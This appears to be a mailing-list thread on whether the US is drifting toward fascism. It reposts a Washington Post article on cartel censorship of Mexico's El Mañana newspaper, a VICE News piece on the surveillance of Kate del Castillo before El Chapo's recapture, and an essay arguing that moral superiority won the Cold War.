things dear to me like friends and new family, and became comfortable
in a lifestyle with all needs met.
now USA in a state of perpetual war, executive power at record levels,
surveillance staggering in breadth and invasiveness, censorship and
suppression of speech creeping ever further into the centralized
systems dominating over our way of life, it's not good...
 and yet we're not rounding up foreign-born citizens and their
families for incarceration at detention camps (like Japanese during
the war).  not to mention that much of the rest of the world would be
killed or imprisoned leading my kind of  life in another jurisdiction!
when people are being killed for exposing corruption or injustice, it
seems ridiculous to complain about annoyances resulting from optional
activities i have chosen to undertake willingly - not out of dire need
or coercion.  with all my needs still met.
all of which made me wonder, what did the every day German or Italian
citizen see before fascism ravaged sanity? what did they see that felt
disturbing, but not overtly threating and could be ignored? what did
they see which told them all legitimacy was lost and only resistance
the  rebellion staged their last stand in my state, with
land use abuse the straw upon their broken backs. perhaps loss of
livelihood a better Rubicon?
then another "If you quit doing that, it would all be much easier..." was said,
and i wondered if this was the key sign of trouble i was fearing to
see. when lawful activities performed for the good of the public draw
unjustified scrutiny and disruption from the state, has the state
itself become corrupt?
how far must this corruption spread before it cannot be stopped
without destruction of the state, no matter the size and vehemency of
public protest?
can the tools of technology and manufactured consent provide the state
ability to become completely corrupted without detection, nor
resistance from the public?
i don't know the answers, and i am curious to hear opinions.
i still live a rich life with needs met and i don't think we're on the
brink of a fascist nightmare future. maybe hell on earth is closer
than i think...
best regards,
NOTE: i am using the terms fascist and fascism explicitly, not capriciously.
Fascism is a form of radical authoritarian nationalism that came to
prominence in early 20th-century Europe...
Fascists saw World War I as a revolution that brought massive changes
in the nature of war, society, the state, and technology. The advent
of total war and total mass mobilization of society had broken down
the distinction between civilian and combatant. A "military
citizenship" arose in which all citizens were involved with the
military in some manner during the war. The war had resulted in the
rise of a powerful state capable of mobilizing millions of people to
serve on the front lines and providing economic production and
logistics to support them, as well as having unprecedented authority
to intervene in the lives of citizens. Fascists view World War I as
having made liberal democracy obsolete, and regard total mobilization
of society under a totalitarian one-party state as necessary to
prepare a nation for armed conflict and to respond effectively to
economic difficulties. Such a state is led by a strong leader — such
as a dictator and a martial government composed of the members of the
governing fascist party — to forge national unity and maintain a
stable and orderly society. Fascism rejects assertions that violence
is automatically negative in nature, and views political violence,
war, and imperialism as means that can achieve national rejuvenation.

Juan, let me return your incredulity with clarity,
i know i'm old, but that also means i remember a time we were not
actually at war (except drug war! in hindsight, that counts as war
well enough...)
incarceration rate alone doesn't tell the tale. part of this problem
is a "success" in prosecution and consistent(sorta) sentencing.
speaking of ending endless wars, drug sentences will reduce this a
fair amount, but significant reduction will require significant
reduction in sentences...
which is ok, as anything beyond 5 years is just punative;isolationary
- not rehabilitation.
Narcos a local example of serious threat, vs. annoyance.
 - i don't fear accidentally eating polonium, ever, for example. ;)
is this where you advocate direct action to inhibit the machine?
 with unlicensed molotovs and conspiracy to congregate?
  ;)
in seriousness, a detailed and accurate picture of this experience
would be interesting to read.
there are historical references from this period, of dry edification,
but actual accounts from this perspective hard to come by, presumably
because the minds behind them were extinguished...
key aspects which stuck out:
- economic malaise, squeezed lower class.
- theology in service of power, rather than separate.
- business and government collusion in war making.
- nationalism coupled to racism. then ultra-nationalism to mass murder purges.
- willing populace mistaking blunder for boldness, polemics for
persuasion, and ever more cowed into total subservience...
the "justice system" is not total farce; completely devoid of all
credibility. extra-judicial summary killings are not common place.
secrets laws don't ^H^H^H ... ok, part of it quite fucked.
but beyond redemption? this is what i intend by "completely corrupt" -
unable to dispense justice; only deceit on the scales.
propaganda! skillful use of this another key factor for thriving
facism. i meant to add that to the list above...
though perhaps it is your feign of forceful repudiation which is the
facade?  i enjoy your consistent and copious criticism Juan. one day i
hope to enjoy your suggestions, too :)

Censor or die: The death of Mexican news in the age of drug cartels
By Dana Priest December 11, 2015
CONTROLLING THE STORY: This is the fifth installment in an ongoing
series examining the human cost of reporting the news around the
One journalist's experience on Mexico's deadliest beat
REYNOSA, Mexico — As deadline descended on El Mañana’s newsroom and
reporters rushed to file their stories, someone in the employ of a
local drug cartel called with a demand from his crime boss.
The caller was a journalist for another newspaper, known here as an
enlace, or “link” to the cartel. The compromised journalist barked out
the order: Publish an article saying the mayor in Matamoros had not
paid the cartel $2 million a month in protection fees, as an El Mañana
front-page story had alleged the day before.
“They want us to say he’s not guilty,” the editor who took the call
told his colleagues during the episode in late October. Knowing
glances passed between them as a visiting Washington Post reporter
looked on.
They all knew that defiance carried a high price.
The enlaces are part of the deeply institutionalized system of cartel
censorship imposed on media outlets in northeastern Mexico abutting
the border of Texas. How it works is an open secret in newsrooms here
but not among readers. They are unaware of the life-and-death
decisions editors make every day not to anger different local cartel
commanders, each of whom has his own media philosophy.
Submitting to cartel demands is the only way to survive, said
Hildebrando “Brando” Deandar Ayala, 39, editor in chief of El Mañana,
one of the oldest and largest newspapers in the region with a print
circulation of 30,000. “You do it or you die, and nobody wants to
die,” he said. “Auto censura — self-censorship — that’s our shield.”
Readers get angry when they don’t get the news they need, he said.
Resentment against El Mañana grew so strong two years ago that
reporters took the logos off their cars and stopped carrying their
identification on assignments.
“The readers hate us sometimes,” Deandar said. “But they don’t know
the real risks we go through.”
Mexico has long been a deadly place for reporters. Some 88 journalists
have been slain in the last two decades, according to Article 19, a
worldwide advocacy group that promotes press freedom.
With its endless drug wars, Mexico is one of the most dangerous places
in a world that has seen a recent upswing in violence against
journalists, with scores of reporters killed or jailed in Afghanistan,
Pakistan, the Arab Spring countries, Central America and the former
Soviet bloc.
[Read previous stories from this series]
The risks have been especially high for El Mañana because its
circulation area is bounded to the west by the birthplace of the Zetas
criminal network in Nuevo Laredo and to the east by the Gulf crime
syndicate’s home base in Matamoros.
In February, the last time El Mañana defied a cartel’s censorship
rules, an editor in its Matamoros bureau was dragged outside, stuffed
in a van and beaten as his abductors drove around threatening him with
“Next time, we’ll kill you!” one yelled before pushing him out of the vehicle.
Four El Mañana journalists have been killed in the past 10 years.
Others survived assassination attempts, kidnappings, and grenade and
machine-gun attacks on their offices. Deandar has been shot, kidnapped
and had his home set on fire, he said.

The worst assaults began in 2004, when an editor in Nuevo Laredo was
stabbed to death. Two years later, gunmen broke into the bureau there,
detonated a grenade and sprayed machine gunfire, leaving one employee
Afterward, bulletproof glass and electronic security keys were
installed at its three offices, where the blinds are always drawn.
In March 2010, when the Gulf cartel defeated the Zetas for control of
Reynosa, it took revenge on three El Mañana reporters whom the Zetas
had forced to watch one of its mass executions.
The cartel called the three Reynosa reporters and told them, “ ‘either
you come in or we’ll pick you up,’ ” an editor there at the time
They surrendered to the cartel and were never heard from again. Their
presumed slayings were never reported by El Mañana, editors said,
because that’s what the Gulf commander demanded. The enlace passed
word that the killings were a one-time message to the Zetas, not a
tactic the cartel intended to repeat against the newspaper.
Twice in 2012, gunmen from the Zetas shot up the offices of the Nuevo
Laredo bureau. Not long after, El Mañana announced it would no longer
print cartel news in its Nuevo Laredo edition. Articles about Nuevo
Laredo crime sometimes appear in other editions, but without a byline
or names in the story.

North America’s ISIS
The cartels’ tactics resemble those most Americans would associate
with al-Qaeda and the Islamic State. The display of multiple beheaded
corpses and bodies hanging from bridges are a regular occurrence.
Hundreds of young people have disappeared. Mass graves are
The comparison with terrorist groups 7,300 miles away frustrates
journalists here. They watch the endless international coverage of
Middle East violence yet know that the terrorism just across the U.S.
border is largely ignored by the American media.
Mexico’s 2014 murder rate of 13 per 100,000 is twice as high as Afghanistan’s.
“We have a war here, and we’re doing war reporting,” said Ildefonso
“Poncho” Ortiz, a deeply sourced reporter for Breitbart News Network’s
Cartel Chronicles, one of the only American outlets to track cartel
maneuvers. “Sometimes AP [the Associated Press wire service] will pick
up a story, but other than that, it never leaves the valley.”
The three largest U.S. newspapers nearby — the Brownsville Herald, the
Monitor in McAllen, Tex., and the Laredo Morning Times — forbid their
reporters from crossing to report because it’s too dangerous,
according to the editors at the newspapers.
Pervasive corruption abets the violence. The local police forces have
been disbanded and replaced by the army and federal police in the
northern Mexican state of Tamaulipas, which includes Matamoros, Nuevo
Laredo and Reynosa.
A car bomb killed the Nuevo Laredo mayor one week after he was sworn
in. The new Matamoros mayor survived an ambush in March. Cartels
install surveillance cameras throughout their cities and employ
lookouts with cellphones to keep watch. U.S. Border Patrol officers
are regularly indicted for cooperating with organized crime.
“Tamaulipas is a black hole when it comes to information,” said Aaron
Nelsen, a reporter based in McAllen for the San Antonio Express-News.
“It’s so hard to get anyone to talk about it,” even elected U.S.

A cartel media director
El Mañana’s circulation area includes major U.S. border cities; its
online editions are read as far north as San Antonio and Houston.
It is a third-generation family enterprise, founded in 1924 as an
anti-establishment voice. Over most of its 91 years, its formidable
enemies were corrupt politicians and their hand-picked prosecutors.
The newspaper now maintains a working relationship with the local
governments, as evidenced by the government advertising it receives.
Withholding state advertising dollars is a common and effective
economic hammer used against media outlets whose investigations upset
the status quo.
“When it’s not the politicians against us, it’s the drug dealers,”
said Heriberto Deandar, 78, who co-owns El Mañana with his brother,
Brando’s father. “He who is not afraid has no courage.”
Brando was raised in Reynosa but moved to McAllen in 2007 for safety
reasons. He commutes to work. Asked why he doesn’t find a safer job,
he said simply, “It’s in my blood. I cannot leave.”
During a recent visit to the town, the eerie atmosphere was inescapable.
Reynosa’s wide boulevards were nearly empty. Heavily armed soldiers
patrolled in black masks to protect their identities from cartels
resentful of the army’s two-year occupation.
Military helicopters whooped periodically overhead, racing to
shootouts or hunting suspects. At dusk, hundreds of cars streamed
slowly across the international bridge to McAllen, where an increasing
number of well-to-do Mexicans have moved their families to safety.
The Metros faction of the Gulf cartel controls much of civic life and
all contraband — drugs, sex slaves, immigrant smuggling, fuel, stolen
vehicles — in or moving through Reynosa, said journalists and media
experts here. Its commander, whose parents are from Reynosa, has a
more liberal view of the media than his counterparts in the other two
He seems to care about his image, too, they said, as evidenced by the
“narcobanners” that appeared on city bridges in November.
“This is to make it clear that I am a narcotrafficker, not a terrorist
like you’ve been saying in the media,” the cartel boss declared in one
handwritten sheet-sized banner. “Investigate and check your facts.
Crime has lessened since I took charge.”
In Matamoros, though, the commander of the cartel’s Ciclones faction
tolerates no coverage. In Nuevo Laredo, the Zetas have a commander of
finance, assassinations, logistics, stolen vehicles and fuel, weapons,
prostitution, immigrant smuggling — and media.
The Zetas media director, a clean-cut, 30-something man described by
one person who knows him as “a pretty friendly guy,” calls enlaces and
beat reporters at El Mañana and other media outlets every day to tell
them what stories the cartel wants published or censored. One day it’s
a story critical of new government limits on imported cars; the next
it’s a birthday party in the social pages featuring a cartel boss’s
daughter. Sometimes the media director provides photos and video for
an article.
“It’s a common conversation every day,” one reporter said.
Reporters have learned to consult him on nearly everything, one media
expert said. Even a car crash isn’t a simple car crash. “You have to
call somebody to make sure you can write about it,” one journalist
said, because it might actually not be an accident but a purposeful
vehicular homicide organized by the cartel.
Critical coverage of local politicians is also forbidden.
For his own security, the media director changes cellphones often, but
his online avatar always stays the same: a rabbit.
The three cartel commanders’ differing media philosophies force El
Mañana to produce three distinctly different editions. “If you want to
find out what’s happening in Nuevo Laredo or Matamoros, you read El
Mañana de Reynosa,” Deandar said.
For example, when Mexican troops captured the leader of the Matamoros
faction in October, known as “Ciclón 7,” El Mañana did not print a
word about it in its Matamoros edition. But in Reynosa and Nuevo
Laredo, it was banner news.
With Ciclón 7 gone, Deandar said, “we are waiting to see who is the
next chief, so we’ll know the rules.”

in February because the paper defied its news blackout, discuss
coverage in Deandar’s office. (Jabin Botsford/The Washington Post)
Mechanics of self-censorship
After hearing the enlace’s demand to exonerate the allegedly corrupt
mayor in Matamoros, the editor on duty rubbed his head trying to
contain himself.
“First they tell us what not to publish, now they are telling us what
to publish!” he yelled before heading upstairs to his office.
He dialed the editor in Matamoros who had passed the enlace’s message
to Reynosa, put the phone on speaker mode and upped the volume so the
whole room could hear.
Enlaces pass instructions via phone calls, text messages, apps and in
personal meetings. They often communicate cartel demands to crime
reporters who show up at the scene of shootouts, blockades, car bombs
and executions.
Sometimes a cartel member will run into crime reporters at the scene.
“They’ll say, ‘Get the hell out of here! We’ll kill you!’ And we have
to go,” one reporter said.
Three minutes into the conversation with the Matamoros editor, the
senior editor began raising his voice about the enlace.
“Give me his name and number!” he shouted. “And tell him you’re not
going to take any more messages! No more! Tell him if you take any
more messages, I’m going to fire you!”
He hung up, waved around the piece of paper with the enlace’s name and
phone number on it and then stood up. It was getting dark. Time to
leave for a safer city.
The front-page story that upset the cartel was a reprinted interview
with the new mayor of Matamoros, Leticia Salazar, an anti-corruption
crusader. The interview was conducted by the national Excelsior
newspaper. In it, she accused her predecessor of paying the Gulf
cartel more than $2 million a month in protection fees from public
works funds and towing fees.
El Mañana’s editors felt safe publishing the interview in all editions
because it seemed like a political corruption story, not one about the
The cartel demand that followed was to run an interview with the
former mayor quoting him as saying he was innocent of the allegations.
But the former mayor had not requested an interview.
As he left the building, the duty editor said he planned to call the
former mayor on the way home.
Speeding through Reynosa’s back roads in the dark, he called the
former mayor, who said he had not requested an interview and did not
know the cartel had demanded one on his behalf.
It was time for a decision. “If you want an interview, we can do it in
our office or over the phone,” the editor said. If it’s in the office,
“we will need a photo of the interview; if it’s over the phone, we’ll
have to record it. Either way, we need to show it was real,” not
something made up by the cartel.
We won’t publish it right away, the editor added, so the cartel won’t
think it can tell the newspaper what to print.
The interview ran three days later, in all editions, including
Matamoros, where it mattered most to the cartel. But there was no

Social media steps up
Several years ago, shopkeepers, doctors, lawyers, mechanics, local
government workers and students began to fill the void in local news
with social-media coverage. It took the cartels a while to understand
what was happening on anonymous Twitter accounts and Facebook pages.
Once they did, retribution followed. On Sept. 26, 2011, the
decapitated body of a female blogger was left at the Christopher
Columbus monument in Nuevo Laredo. Next to her corpse were two
keyboards and a handwritten warning, signed “ZZZZ.”
But social-media crime reporting has only grown in the four years
since. It includes real-time maps of shootout locations, slayings and
kidnappings as well as endless cellphone videos of crimes in progress.
During the Post reporter’s visit in October, alerts and bulletins
about news that went unreported by El Mañana were rife on social

Her followers frantically refreshed their Twitter feeds trying to find
her. The next morning, at 5:04 a.m., a tweet from her account
appeared: “Friends and family, my real name is Maria Del Rosario

Minutes later, two photos appeared on her account. One showed Fuentes
Rubio in distress. “Close your accounts, don’t risk your families the
way I did,” her account read. “I ask you all for forgiveness.”
The second photo showed what appeared to be her bloodied face and
corpse on the ground. No one has been arrested.
An opening
In February, a few months after Fuentes Rubio was killed, the two
factions of the Gulf cartel in northeastern Mexico went to war again.
The chaos provided El Mañana with the kind of journalistic opening it
hadn’t had in 15 years.
With the cartel preoccupied, El Mañana became the newspaper it might
otherwise be had circumstances been different. The entire newsroom
deployed to cover the battles. Dramatic photos, detailed articles and
screaming headlines won Mexico’s attention.
Readers in Reynosa finally got the full story of what was happening around them:
Day One: “Border in Shock,” “Shoot-Outs and Roadblocks . . . ”
Day Two: “Border Under Siege: Marines Attacked, Three Armed Men
Killed, Soldiers Wounded”
“We were all excited in the newsroom,” said a longtime senior editor
who shepherded the coverage. “It was an adrenaline rush.”
“No other newspaper in the state” provided such detailed coverage.
“They were all afraid,” he said, nodding toward Deandar. “We have a
courageous boss.”
This was such big news, Deandar said he thought at the time, that he
wanted to share it even with readers in Matamoros despite the standing
cartel news blackout there. To be cautious, there would be no bylines
and no names of cartel members.
The cartels would not approve, cautioned Enrique Juarez, his Matamoros editor.
Just after midnight, the red printing press in Reynosa rolled out Day
Three’s edition. “Nine Dead in Fighting: Third Day Siege in Urban
Areas and Roads.” Delivery trucks dashed to their distribution hubs.
By 3 a.m., El Mañana employees discovered that the truck carrying the
newspapers for Matamoros had vanished. Deandar rallied a posse; they
found the vehicle at noon in an abandoned field, still full of
newspapers. He ordered the papers be delivered to Matamoros, where
they hit the streets an hour later.
Juarez, up in his second-floor office, got threatening phone calls right away.
At 4 p.m., as deadline loomed, someone called from the lobby asking
him to come down. He found a knife and braced himself. Armed men burst
in. One picked up a big jug of water and threw it at him, causing him
to drop the knife.
“We’re going to break you!” one yelled, as they dragged him away. They
stuffed him into a van, beat him about the head and back, and shoved
him onto the pavement an hour or so later.
Four frightened El Mañana employees in the Matamoros bureau resigned
the next day.
A story about Juarez’s abduction and a photo of him at his desk, with
the assaulting water jug, ran on Day Four next to the headline, “30
Dead Already, Mayor Suffers Grenade Attack, US Consul Suspends
It did not appear in the Matamoros edition. Juarez and his family left
the city. He no longer works in Matamoros.
He is still not right, he said in an interview. “I don’t feel safe. I
look around when I go out.” He worries that the fighting cartel
factions will team up again and come after him.
“If I had the opportunity to leave . . . ” His voice trails off.

did not like, is shown in the El Mañana office in Reynosa, Mexico, in

The Actress Who Linked Up Sean Penn with El Chapo Was Under
Surveillance Since 2014
By Nathaniel Janowitz
January 12, 2016 | 1:05 am
Kate del Castillo — the actress who took Sean Penn to interview El
Chapo — had already been under surveillance for her links to the drug
lord for 14 months before the meeting took place in a mountain
In the wake of the kingpin's recapture on Friday, Mexican authorities
said that the monitoring of contacts with actors and producers aided
the manhunt launched in the the wake of his tunnel escape from prison
in July. An unnamed official told The Associated Press that the Penn
interview in October directly led to an operation that almost caught
up with him then.

Drug Lord's Capture
Now El Universal has published details of the surveillance of Del
Castillo it claims was well-established before his escape from the
Altiplano maximum-security prison and continued after he was a
fugitive. It said their contact included letters exchanged while he
was in jail, as well as several meetings between the actress and
Guzmán's lawyers prior to their mountain encounter.
The article is backed up by photos purported to be taken before and
during the meetings, as well as snaps of her and Penn meeting Guzmán's
associates upon arrival in Mexico on October 2 on their way to
interview El Chapo.
The paper said the surveillance of Del Castillo began in August 2014.
El Chapo reportedly instructed one of his lawyers, Andrés Granados
Flores, to contact her about making a biopic about his life. Through
Guzmán's legal team the actress and drug lord wrote to each other
regarding the project.

Sean Penn to 'Chapo'
The first face-to-face meeting between Del Castillo and Granados
reportedly took place on June 16, 2015 — still nearly a month before
Chapo's jailbreak — in an upscale restaurant named the San Ángel Inn,
located in the south of Mexico City. The paper claimed it has seen
photographs from the meeting showing the actress wearing a black
blouse and a white skirt, while the lawyer wore a black suit.
El Universal said that Del Castillo and Granados met again after Chapo
was on the run, on September 25, in the Western City of Guadalajara. A
published photograph purports to show her after arriving on the
airline Aeroméxico, flight 783, from Los Angeles.
Another from the following day claims to show her sitting in a
restaurant with Granados and another member of Guzmán's legal team,
Óscar Manuel Gómez Núñez.
The report said she saw the lawyers twice on that occasion. First for
dinner and the following morning when they gave her a phone with some
sort of special features that would allow her to communicate directly
with Joaquin Guzmán.
The timing of this meeting appears to be reinforced by Sean Penn's
Rolling Stone article in which he says that on September 28 he got
confirmation from his contact with Del Castillo that he would be able
to meet Chapo.
Penn wrote that he and Del Castillo flew from Los Angeles to an
unnamed "city in mid-Mexico" in a chartered plane four days later.
According to the article in El Universal, the city was Guadalajara and
the plane was a Hawker 900XP private jet. The paper published a photo
it said was of the actors meeting the lawyer. From there they
reportedly went to the Hotel Villa Ganza where they registered,
dropped off their equipment, and left.
actors in two vans to Tepic, the capital of Nayarit state. Penn also
said they travelled to another city that he did not name.
Both accounts say the group boarded two private planes — El Universal
says one was white and the other yellow — at a tourist resort with a
private airstrip that took them into the Golden Triangle mountain
According to Penn's article, they were accompanied by one of El
Chapo's sons, Alfredo Guzmán.
Penn noted in his article his own concerns about being tracked in the
plane but said that Chapo's son put him at ease by pointing out a "red
scrambler switch below the cockpit controls" that he claimed blocked
ground radar and that an inside man provided them with information
about when the military's high-altitude surveillance plane has been

Bunker suggested that somebody may had "sold the narcos a 'high
technology scrambling system'—but it really doesn't work." Another
possibility could be that Penn was told a story to calm his fears.
After the flight, they arrived in the Golden Triangle. After a long
road trip they met El Chapo for seven hours of chatting, tequila, and
tacos, before agreeing to meet eight days later for a two-day long
This interview never took place because three days after Chapo, Penn
and Del Castillo met, the kingpin narrowly slipped a navy operation to
capture him.
An unnamed source in Mexican federal law enforcement told The
Associated Press that it was the Penn interview that triggered that
Some, however, are not so sure.
Mexican columnist Raymundo Riva Palacio wrote on Monday on the website
ejecentral that the authorities had already identified Chapo's precise
location in the Sierra before the interview.
While he says that surveillance of Del Castillo would have provided
useful information in the manhunt for the fugitive after his escape,
her presence in the area alongside a major movie star actually
postponed the operation to try and capture him.
"The US requested that the operation to capture him be postponed 72
hours," Riva Palacio told VICE News, insisting he had two reliable
Mexican sources confirming this. "My theory is that they are putting
the emphasis on the actors because they are protecting somebody,
perhaps undercover people."
In the end Chapo escaped that operation and was not tracked down until
Friday, January 8, in the northern city of Los Mochis, Sinaloa.
A gopro video was released on Monday showing the initial stage of the
raid on a safe house where Guzmán was hiding. Gun shots and arrests
take place for 15 minutes as they search for El Chapo in the video.
The drug lord had slipped out of the house into the city's sewage
system through a hole tunnel reportedly built in a closet. He was
caught hours after resurfacing, stealing a vehicle, and attempting to
flee the city.
Penn's article created a major stir when it was published on Saturday
night. The star said he had "nothin' to hide" in a brief email
exchange with The Associated Press. Del Castillo has yet to make any
comment at all, other than to tell a reporter from Univision,
"Everything when and how it should be. Don't call me again."

Guantanamo is closing!  (that's not nothing, right? :)
regarding american wars, this is a tale longer than time to tell it...
  instead, this treatise which i enjoyed for through provocation,
   regardless of how your view its correctness:
"On the Moral Superiority"
 - On the Moral Superiority
There are a lot of news about the leaked Afghan War documents. And a
lot of descriptions of Wikileaks as a threat to the US national and
military security.
Which reminds me a lot of things.
The Cold War
Most Westerners are convinced that Ronald Reagan won it, by raising
the military expenses of USA to a level that the Soviet bloc could not
afford. This is not the first gross Western misconception about the
communism – but is a very important one.
Every single penny in the cost of everything, be that a toaster, tank
or ICBM, is eventually spent on someone’s salary. If you can pay
peanuts, you can produce tanks and ICBMs for peanuts… That was the
case in the Soviet Union. The head of an ICBM project there was paid
about one tenth of the salary of a floor sweeper in an US ICBM
project. And, living in the Soviet Union, he could not run away for a
higher salary. In fact, the Soviet Union could push the military
spending to a level that USA would not be able to afford, just because
they spent so much less per a result than the Americans. (A hint for
the future: watch China.)
Why, then, the Soviets did not win the Cold War, if it was so easy?
Because they could not achieve moral superiority over USA. An
unrealistically sounding answer – if you haven’t lived in a communist
country, and don’t know the situation from inside.
Immediately after the WWII we, who remained in the Soviet bloc, saw
our stand against the Western bloc as a patriotic one. We saw that the
Soviet order was horrible, but the order in the Western bloc was also
not very nice. We had Lavrentiy Beria etc., but the West had Barry
Goldwater etc. The Soviet Union orchestrated aggressions and coups all
around the world, but the U.S. did the same. Where there is no clear
“good” and “evil”, there is only “us” and “them” – and, of course,
everyone is with “us”, not with “them”.
Things changed drastically under John Kennedy, and even more under
Lyndon Johnson. The censorship and the anti-communist witch hunt in
the US disappeared. The civil liberties were strengthened. And despite
the Iron Curtain, this was noticed in the Soviet bloc. Suddenly,
“them” ceased to be about as bad as “us”. We saw that “them” is the
Good, and “us” is the Evil. We started believing that “them” means
freedom, sincerity, truth, decency, while “us” means lies, hypocrisy,
and life in a prison.
The West had achieved a moral superiority.
But how this translated into a Cold War victory?
You can’t run away from a Soviet country, no matter how much you
despise it. However, if you are forced to remain there, you lose your
initiative, inventiveness and desire to work, create and win. And,
most of all, you lose your trust in the system, and your hope for a
better future… The most important engine of the economics, the impulse
of the people to work and create, went dry. The economics continued
going for some time, supported by the effect of the scale, but
eventually stuck. And to our perceptions of the West added one more –
“wealth”. Actually, a “deserved, decently obtained wealth”.
Even the top Soviet functionaries had lost their trust in the
communist system. Publicly, every time they spoke, they acclaimed the
Soviet superiority. Privately, they didn’t believed a word from what
they said. They regarded everyone who believed that the Soviets can be
superior in any way as idiots, brainwashed by the lies they themselves
fabricated. When told: “We can beat the West in the arms and space
race”, they didn’t believed it, despite the calculations they were
shown, and despite that they had nearly done it during the 60s. “If
you believe one thing, and the Western experts believe otherwise, then
it is them who must be right. There is no way you can be right, there
is no way for us to be the better. It is them who speaks the truth,
and us who cheats and lies.” This is what everyone was convinced in –
even the Party core and top.
The military buildup and the “Space Wars” of Ronald Reagan merely
coincided with the final stages of the Soviet economic deterioration.
The rot was clearly seen from inside even before Reagan, and many
people understood it is a matter only of time before the Soviet system
falls apart economically. (Most of us expected this fall to come
later, but to be a catastrophic one: happily, we were wrong.) The
military race could have speeded it up a bit, but I doubt even this –
the Soviet bloc practically didn’t tried to increase the military
spending in order to counter Reagan. There was no use in doing this.
The Cold War was already won by the West, and not in the arms race.
It was the moral superiority that won it. That rendered the Soviet
“army” unwilling to fight – in fact, willing to desert at first
opportunity, and expecting and hoping to lose… The result was the only
possible one. The Soviet bloc simply disappeared into the thin air,
without a single gunshot against the West.
As a student, I saw once a man who was bent on organizing a crusade
against the evil capitalism. He tried to recruit for it every single
person he saw. And always failed… Instead of on the top of some
government body, the system had placed him in a mental clinic. Despite
that this obsession was his only peculiarity.
This is how much the Soviet system believed in itself, facing the
Western moral superiority. In a country where everyone publicly called
for the fall of the capitalism, this man hadn’t seen in his life a
single person who would actually fight the capitalism. Or even believe
that this is a sane idea…
If Osama bin Laden was in a situation similar to the Soviet bloc, he
shouldn’t be able to find a single follower. And the Arab countries
are not as anti-Western as the Soviet bloc was, so his task should
have been even tougher. How is that he found thousands of followers?
Some people believe this to be an effect of the Islam. However, the
communism is a religion also, and one that is much less tolerant of
everything decent than even the darkest sects of the Islam. In
addition, 15% of my country’s population is Muslims, and that madman
could not recruit among them, too. Also, before Osama there were many
other militant Muslims who went on a jihad against the West, and none
found a significant number of supporters. Despite that the US were
supporting then Israel as firmly as now, etc… Obviously, it is the
situation that changed.
The people from Western Europe would not go on a jihad. However,
during the last decade their opinion on the USA plummeted, too. Twenty
years ago, if you were an American in Berlin, you would be revered,
and more honored than the Berliners around… Not anymore. Now, you can
often hear: “The country that lied to the entire world about the Iraqi
WMD? That created and still maintains the Guantanamo gulag? That ran
the Abu Ghraib prison? That bombed to destruction the civilians in
Faluja? That shot the Italian hostage resque mission? That killed the
Reuters journalists in Baghdad? That photographs, fingerprints and
tracks every visitor like a criminal? That created the ECHELON system?
That is killing in Afghanistan maybe more civilians than terrorists?…
If it is decent, then Stalin is, too. This country is a blemish to the
Of course, the real criminal is the war itself. In a war, no involved
army can avoid such things. The war always de-humanizes the people.
And sometimes you can’t avoid wars… However, a moral country is
expected to not lie to the other countries, in order to involve them,
too, in a non-justified war. To not organize gulags. And when its
soldiers perform some nasty crime, to not try first to cover it.
Otherwise, this country starts being considered by the entire world as
an immoral, cheating and lying one. If it is bigger and stronger, it
earns the “Evil Empire” nickname, and deservedly. All of its moral
superiority, earned with bitter, painful and long-lasting sacrifices,
and often paid with the lives of many of its best people, quickly
The worst comes when this country continues to pretend that it is the
mainstay of the world decency, morality and human rights. These
pretensions make me, who has lived twenty-odd years in a communist
country, instantly remember another country. One that pretended that
it is the source of all human rights in the world, but actually was a
big prison. The Soviet Union… Yes, there are differences. But not ones
that matter when it comes to moral image and leadership.
What about Wikileaks?
What Wikileaks does is exposing the indecent and immoral things done,
in this case, by the US army. When Adm. Mike Mullen says that this
risks the lives of American soldiers or Afghan informants, he surely
doesn’t believe himself – the leaked documents do not contain enough
info to endanger them. Few people, if any, will believe him… What he
actually achieves is to remind me (and not only me) of another kind of
people, who also said what neither they nor anybody else believed. The
Soviet functionaries.
I don’t know if Pfc. Manning is the person who leaked those documents
(and the “collateral murder” video on which the US copter pilots
killed the Reuters journalists). If yes, he reminds me of another
person – Hugh Thompson Jr, the officer who stopped the My Lai
massacre, and leaked the info about it. He was sharply criticized by
the US Congressmen for this. He was sent to missions without adequate
cover and supply until he was gunned down and nearly killed. However,
he was awarded a medal by the US government, because of his humanity.
Will the same happen with Pfc. Manning? I doubt it. Given the current
situation, it is more like he will get a sentence, and the medal will
be preserved for those who will succeed to shut down Wikileaks. Which
is another proof that the things in USA have changed – and a proof
which direction they took.
… Remember the great support Obama had among the ordinary people
abroad before the president elections? Especially in Europe? There is
a reason for this support. The ordinary people hoped that he will
restore the US moral superiority, by bringing moral to the US
politics… He failed to do it. The Guantanamo gulag stays. Some
measures are taken to prevent the worst things the US Army does abroad
– however, the “culture of concealment” is stronger than ever. Slowly,
but surely one trend emerges and grows in the thinking of the people
outside US. Namely, that this state has gone too far on the Evil
Empire road. That it cannot be stopped anymore, even by a
good-intended President. And that it is better late than never to say
openly: “Things changed. This is not anymore the moral leader of the
world – this is just another evil empire. One that the decent people
must hate, loathe and oppose to.”
What will happen if this trend of thinking prevails? Easy guess.
Al-Qaeda will grow and attract more and more people, and will probably
obstruct more of the US activity abroad. In fact, it may gain enough
support to carry its fight on American soil. The support for US in
Europe and the rest of the world will gradually diminish, to the
extent that even the pro-US politicians will have to become blind and
deaf to the USA needs. And very surely there will be new “cold wars” –
economic, cultural etc. – between USA and some other countries, but it
will not be possible anymore to win them through moral superiority.
Know Thy Enemy
USA is still the strongest military power in the world. However, even
it cannot afford a major war against a decently strong enemy on its
soil. And an union between some of the other top countries might prove
as strong militarily. Not speaking that USA is not the world biggest
exporter since quite a lot of time, and relatively soon is going to be
dethroned from the first place in the economics, too. (In fact, the EU
already did it.) So, a question arises – how USA is going to maintain
its influence in the world?
Typically, influence is maintained by what you export, in the broadest
sense of the word. Currently, USA exports almost only military power
and economic size. In not a long time these will diminish, compared to
other countries. Unless USA finds something else to export, and to be
the top exporter, its influence in the world will be lost. Which
carries a lot of problems for it, and for the world, too.
The single thing that USA is uniquely positioned to export is exactly
the moral superiority. Its long-standing culture of freedom,
compassion and civil liberties is still unmatched anywhere in the
world. If properly extended to the people outside USA borders, it can
restore this superiority, to the extent USA can become its
overwhelming exporter. However, the freedom and the civil liberties
inside USA are seriously eroded during the last decades, and it seems
that this trend will not be reversed easily. And the growing tendency
to treat the non-US citizens as second-class people doesn’t help too
Still, it is worth trying to do what can be done to preserve the moral
superiority. The history has clearly shown that every bit of it is
worth more than an army of tanks, even in a war. Unless USA choose
this path, they are headed where the decadent Roman Empire was headed
– to internal corruption, weakness and ultimately disappearance. This
is the road down that every evil empire takes, sooner or later.
To preserve moral superiority, the US must first learn what is the
